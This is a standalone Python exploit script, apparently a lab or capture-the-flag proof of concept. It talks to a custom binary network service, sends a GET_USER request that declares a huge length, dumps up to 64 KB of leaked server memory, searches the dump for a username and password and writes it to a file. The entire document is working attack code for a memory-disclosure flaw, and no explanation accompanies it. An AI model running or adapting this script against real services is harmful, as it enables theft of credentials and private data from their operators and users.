#!/usr/bin/env python3
import socket, struct, sys, string

HOST, PORT = sys.argv[1], int(sys.argv[2], 0)

def recvn(s, n, timeout=1.0):
    s.settimeout(timeout)
    buf = b''
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk: break
        buf += chunk
    return buf

s = socket.socket()
s.connect((HOST, PORT))
assert recvn(s,1) == b'\x05'

def set_user(name_b):
    s.send(struct.pack('<BH', 0, len(name_b)) + name_b)
    assert recvn(s,1) == b'\x06'
    _ = recvn(s, len(name_b))

def try_pass(pass_b):
    s.send(struct.pack('<BH', 2, len(pass_b)) + pass_b)
    _ = recvn(s,1)   # b'\x08' on success, but success is not required to leak

user = b'johndoe\x00'
pwd  = b'password\x00'

set_user(user)
try_pass(pwd)

# vulnerable GET_USER: request huge length
s.send(struct.pack('<BH', 1, 0xffff))
assert recvn(s,1) == b'\x06'
dump = recvn(s, 65535, timeout=1.0)
s.close()

print(b"first 256 bytes:", dump[:256])
if b'johndoe' in dump or b'password' in dump:
    print("[+] Found target tokens near indices:",
          dump.find(b'johndoe'), dump.find(b'password'))
open("single_dump.bin","wb").write(dump)
print("[*] wrote single_dump.bin")
